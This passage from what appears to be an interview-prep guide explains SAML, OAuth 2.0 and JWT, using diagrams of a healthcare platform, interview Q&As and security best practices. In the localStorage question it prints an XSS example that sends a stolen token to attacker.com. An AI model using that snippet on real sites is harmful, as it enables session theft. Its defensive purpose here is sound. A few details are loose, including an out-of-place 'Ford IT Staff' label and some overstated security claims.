             └─ OAuth 2.0 for Third-Party Apps     │
                (Apple Health, Fitbit)

All authentication methods:
├─ OAuth Tokens are JWTs
├─ SAML integrates with Spring Security
├─ JWTs used for API requests
└─ All secured with HTTPS/TLS
```

---

## Real-World Implementation

### CareFirst Healthcare Platform

CareFirst implemented a comprehensive authentication system combining all three protocols:

#### Corporate SSO with SAML
```
Ford IT Staff
    ↓
Okta SAML IdP
    ↓
SAML Assertion
    ↓
Member Portal Web App
```

#### Third-Party Integration with OAuth 2.0
```
Apple Health App
    ↓
OAuth Authorization Request
    ↓
User Grants Permission
    ↓
Authorization Code
    ↓
Access Token (JWT)
    ↓
API Calls to CareFirst
```

#### Mobile App with JWT
```
CareFirst Mobile App
    ↓
Email + Password Login
    ↓
Access Token (JWT) + Refresh Token
    ↓
Store Securely in Keystore
    ↓
API Calls with Bearer Token
```

### Architecture Diagram

```
┌──────────────────────────────────────────────────────────────┐
│                    CareFirst Platform                         │
└──────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│  Client Layer                                               │
├─────────────────┬──────────────────┬──────────────────────┤
│ Web Browser     │ Mobile App       │ Third-Party App    │
│ (Corporate)     │ (Native)         │ (Apple Health)     │
└────────┬────────┴────────┬─────────┴──────────┬──────────┘
         │                 │                   │
         ├─ SAML (XML)    ├─ JWT (JSON)       └─ OAuth 2.0
         │                │
         ↓                ↓
┌───────────────────────────────────────────────────────────┐
│  API Gateway / Spring Security Filter                     │
├───────────────────────────────────────────────────────────┤
│ • SAML 2.0 Service Provider (SP)                          │
│ • JWT Validation Filter                                   │
│ • OAuth 2.0 Resource Server                              │
└───────────┬──────────────────────────────────────────────┘
            │
            ↓
┌───────────────────────────────────────────────────────────┐
│  Spring Boot Microservices                               │
├───────────────────────────────────────────────────────────┤
│ • Claims Service    • Benefits Service                   │
│ • Provider Service  • Member Service                     │
│ • Audit Service     • Notification Service               │
└───────────┬──────────────────────────────────────────────┘
            │
            ↓
┌───────────────────────────────────────────────────────────┐
│  Data Layer                                              │
├───────────────────────────────────────────────────────────┤
│ • Oracle Database (Members, Claims, Benefits)            │
│ • DynamoDB (Sessions, Tokens, Cache)                     │
│ • Redis (Token Blacklist, Refresh Tokens)                │
└───────────────────────────────────────────────────────────┘

Security Features:
├─ HTTPS/TLS 1.3 for all communication
├─ PII encryption at rest and in transit
├─ Token rotation and refresh
├─ CloudWatch logging and monitoring
├─ Rate limiting on token endpoints
└─ Audit trail for compliance
```

---

## Interview Q&A

### Q1: What's the difference between SAML and OAuth 2.0?

**A:** SAML and OAuth 2.0 solve different problems:

**SAML** is an **authentication protocol** — it answers "Who are you?" SAML is XML-based and primarily used for enterprise SSO. When a user logs in via SAML, they authenticate with an identity provider (like Okta) which sends a digitally signed XML assertion confirming identity. The service provider trusts this assertion because it's signed by a trusted issuer.

**OAuth 2.0** is an **authorization protocol** — it answers "What can you access?" OAuth allows users to grant third-party applications permission to access their data without sharing passwords. It's JSON-based and commonly used for third-party integrations (Login with Google, API access for partner apps).

**Key difference:** SAML verifies WHO you are. OAuth 2.0 determines WHAT you can do.

---

### Q2: Can OAuth be used for authentication?

**A:** OAuth 2.0 is not designed for authentication, but it's often combined with JWT to enable authentication. The flow works like this:

1. Third-party app redirects user to authorization endpoint
2. User grants permission
3. App receives authorization code
4. App exchanges code for access token (typically a JWT)
5. The JWT contains user claims (email, name, roles) that can be used for authentication

So while OAuth itself doesn't authenticate, when paired with JWT, it effectively provides authentication. This is why OpenID Connect (OIDC) was created — it's OAuth 2.0 plus an ID token (JWT) specifically for authentication.

---

### Q3: Why use JWT when OAuth already provides tokens?

**A:** JWT is a token FORMAT that can be used BY OAuth, but they're different things:

- **OAuth 2.0** is a protocol defining the flow for authorization (how to grant access)
- **JWT** is a token format defining how to represent claims in a compact, verifiable way

When OAuth generates an access token, that token is often a JWT because JWT provides:
- Self-contained claims (no server lookup needed)
- Cryptographic signature (can't be tampered)
- Compact size (efficient for APIs)
- Standard format (tools widely support it)

So the answer is: they're complementary, not competing.

---

### Q4: How do you prevent JWT token tampering?

**A:** JWTs are protected through digital signatures:

1. **HMAC (HS256)** — Symmetric key signing
   - Server signs: `HMAC(header.payload, secret_key)`
   - Only server and client share the secret
   - Anyone with secret can create valid tokens

2. **RSA (RS256)** — Asymmetric key signing
   - Server signs with private key
   - Client verifies with public key
   - Only server can create tokens

3. **Token validation:**
   - Verify signature matches
   - Check token not expired
   - Verify issuer and audience claims

If someone tries to modify the payload:
- Signature will be invalid
- Server rejects token
- Attack is detected

---

### Q5: What's the difference between access token and refresh token?

**A:**

**Access Token:**
- Short-lived (15 min - 1 hour)
- Contains user identity and permissions
- Used for API requests
- If compromised, damage is limited by short lifespan
- Must be included in every API call

**Refresh Token:**
- Long-lived (days, weeks, or months)
- Used only to get new access tokens
- Never sent to APIs (only to auth server)
- Stored securely on client
- If compromised, attacker can get new access tokens

**Flow:**
1. User logs in
2. Receive access token + refresh token
3. Use access token for API calls
4. When access token expires, use refresh token to get new one
5. Continue with new access token

This design balances security (short-lived access tokens) with user experience (don't require login every hour).

---

### Q6: Can you use JWT with SAML?

**A:** Yes! While not required, JWTs can be used with SAML:

1. User authenticates via SAML with Okta
2. Okta returns SAML assertion
3. Service provider validates assertion
4. Server generates JWT from assertion data
5. Server returns JWT to browser
6. Browser uses JWT for subsequent API calls

This gives you:
- SAML for enterprise SSO (federated authentication)
- JWT for stateless API requests (modern architecture)

Many enterprises do this because SAML is great for initial login but JWT is better for API authentication.

---

### Q7: How do you handle token expiration?

**A:** Two strategies:

**Strategy 1: Refresh Tokens**
```
1. User logs in
2. Receive access_token (1 hour) + refresh_token (7 days)
3. Use access_token for API calls
4. When access_token expires → 401 Unauthorized
5. Client automatically sends refresh_token to /auth/refresh
6. Receive new access_token
7. Retry API call
8. User doesn't notice anything
```

**Strategy 2: Sliding Window**
```
1. Each API request resets token expiration timer
2. Active users never get logged out
3. Inactive users eventually expire
```

**Best practice:** Combination of both
- Access token expires in 1 hour
- Refresh token expires in 30 days
- If inactive for 30 days, user must log in again
- Active users can stay logged in indefinitely

---

### Q8: What's the security risk of storing JWT in localStorage?

**A:** Several risks:

**XSS (Cross-Site Scripting) Vulnerability:**
```javascript
// Attacker injects script
<script>
  const token = localStorage.getItem('jwt');
  fetch('https://attacker.com/steal?token=' + token);
</script>
// Now attacker has your JWT token!
```

**Better alternatives:**
1. **Secure HttpOnly Cookie:**
   ```
   Set-Cookie: jwt=eyJhb...; Secure; HttpOnly; SameSite=Strict
   ```
   - HttpOnly: JavaScript can't access (prevents XSS theft)
   - Secure: Only sent over HTTPS
   - SameSite: Prevents CSRF attacks

2. **In-Memory Storage (for SPA):**
   - Store token in JavaScript variable
   - Lost on page refresh (less convenient)
   - Still exposed to XSS (but harder to exfiltrate)

3. **Secure Mobile Keystore:**
   - iOS Keychain or Android Keystore
   - Hardware-backed encryption
   - Tokens never accessible to app code

---

### Q9: How do you implement Single Sign-Out (SSO)?

**A:** For SAML:
```
1. User clicks Logout on application
2. Application sends SAML LogoutRequest to IdP
3. IdP:
   - Invalidates user's session
   - Sends LogoutResponse back
   - Logs out user from all applications using that IdP
4. User is logged out everywhere
```

For JWT:
```
Option 1: Token Blacklist
├─ On logout, add token to Redis blacklist
├─ Include TTL = token expiration time
├─ Before processing requests, check blacklist
└─ When token expires, automatically removed

Option 2: Logout Endpoint
├─ POST /auth/logout
├─ Validate token
├─ Mark user's refresh tokens as revoked
├─ Next refresh attempt fails
└─ Access token still valid until expiration

Option 3: Session Database
├─ Keep sessions in database even with JWT
├─ On logout, mark session as revoked
├─ Check session on each request
└─ Defeats stateless benefit but enables instant logout
```

---

### Q10: How would you handle a security breach where tokens were compromised?

**A:** Immediate steps:

1. **Invalidate tokens:**
   - Add all tokens to blacklist (Redis)
   - Reduce token lifetime to 5 minutes
   - Revoke all refresh tokens

2. **Force re-authentication:**
   - Log out all users
   - Require immediate login with new credentials
   - Force password reset if needed

3. **Investigation:**
   - Check audit logs for unauthorized access
   - Identify compromised accounts
   - Monitor for suspicious activity

4. **Preventive measures:**
   - Implement token rotation
   - Use short-lived access tokens (15 min)
   - Implement rate limiting on auth endpoints
   - Add alerting for suspicious patterns
   - Regular security audits

---

## Best Practices & Security

### SAML Best Practices

1. **Always use signed assertions** — prevents tampering
2. **Validate assertion signature** — don't skip validation
3. **Check expiration dates** — prevent replay attacks
4. **Use HTTPS** — encrypt in transit
5. **Implement single logout** — clean up sessions
6. **Monitor for assertion replay** — detect attacks

### OAuth 2.0 Best Practices

1. **Use Authorization Code grant** — most secure for web/mobile
2. **Keep client_secret secret** — backend only, never in frontend
3. **Verify redirect_uri** — prevent authorization code theft
4. **Use PKCE** — especially for mobile apps
5. **Implement token rotation** — periodically refresh tokens
6. **Use short access token lifespan** — limit exposure
7. **Validate state parameter** — prevent CSRF attacks

### JWT Best Practices

1. **Use strong signing algorithms** — RS256 (RSA) or HS256 with long secrets
2. **Never put passwords in JWT** — only user ID and claims
3. **Always validate signature** — don't skip this step
4. **Check expiration** — prevent using expired tokens
5. **Use HTTPS** — encrypt in transit
6. **Implement token refresh** — short-lived access tokens
7. **Store securely** — HttpOnly cookies or secure storage
8. **Set appropriate claims** — email, roles, permissions only

### Common Vulnerabilities

| Vulnerability | Prevention |
|---|---|
| **Token Forgery** | Validate signature, use asymmetric keys |
| **Token Theft** | HTTPS, HttpOnly cookies, secure storage |
| **Token Replay** | Include timestamp, revoke old tokens |
| **Exp Bypass** | Always check expiration claim |
| **Algorithm Confusion** | Specify algorithm, don't allow "none" |
| **XSS Attack** | HttpOnly cookies, CSP headers, input validation |
| **CSRF Attack** | SameSite cookies, CSRF tokens, same-origin requests |

---

## Conclusion

SAML, OAuth 2.0, and JWT are complementary technologies solving different security challenges:

- **SAML** for enterprise authentication and SSO
- **OAuth 2.0** for delegated authorization and third-party access
- **JWT** for stateless, modern API authentication

Understanding each protocol and their use cases is essential for building secure, scalable applications.

### Key Takeaways

1. SAML is XML-based, enterprise-focused authentication
2. OAuth 2.0 is JSON-based, third-party authorization
3. JWT is a token format, often used with OAuth
4. They often work together in enterprise architectures
5. Security depends on proper implementation and validation
6. Always use HTTPS, validate signatures, check expiration
7. Implement token refresh for better security
8. Store tokens securely based on context (web, mobile, backend)

---

## References

- [OASIS SAML 2.0 Standard](https://en.wikipedia.org/wiki/SAML_2.0)
- [OAuth 2.0 Specification](https://tools.ietf.org/html/rfc6749)
- [JWT (RFC 7519)](https://tools.ietf.org/html/rfc7519)
- [OpenID Connect](https://openid.net/connect/)
- [PKCE (RFC 7636)](https://tools.ietf.org/html/rfc7636)
- [Spring Security Documentation](https://spring.io/projects/spring-security)

